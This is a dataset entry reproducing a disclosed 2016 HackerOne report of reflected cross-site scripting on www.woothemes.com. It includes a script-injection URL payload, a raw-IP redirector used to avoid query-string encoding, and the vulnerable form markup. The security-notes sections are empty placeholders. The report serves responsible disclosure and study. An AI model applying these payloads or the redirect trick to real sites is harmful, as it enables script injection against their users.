---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '111365'
original_report_id: '111365'
title: XSS at www.woothemes.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: automattic
created_at: '2016-01-18T07:05:59.393Z'
disclosed_at: '2016-02-19T10:20:43.468Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS at www.woothemes.com

## Metadata

- HackerOne Report ID: 111365
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: automattic
- Disclosed At: 2016-02-19T10:20:43.468Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

This XSS vulnerability can be used against IE browsers.
There is an XSS filter in modern IE browsers, so to reproduce we should turn XSS filter off (http://answers.microsoft.com/en-us/ie/forum/ie9-windows_7/how-do-i-turn-off-cross-site-scripting-i-can-no/f3058b73-4956-e011-8dfc-68b599b31bf5?auth=1), or take an old browser without XSS filter (IE7). 
Bypassing an XSS filter in IE will not be covered in this report.

Tested with IE11 with XSS filter disabled and with IE7.
The redirect is used to bypass query string encoding.

1) Visit http://95.213.191.146/r.php?url=http%3A%2F%2Fwww.woothemes.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
2) It redirects to http://www.woothemes.com/product-category/woocommerce-extensions/?"><script>alert(document.domain)</script>
3) the alert is shown on www.woothemes.com

The vulnerable URL:
http://www.woothemes.com/product-category/woocommerce-extensions/?"><script>alert(document.domain)</script>

The vulnerability occurs because the 'action' attribute is not properly filtered at the page:

    <form class="search" id="productSearchForm" action="/product-category/woocommerce-extensions/?23946\"><script>alert(1)</script>0a7f2=1">

Screenshot is attached.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
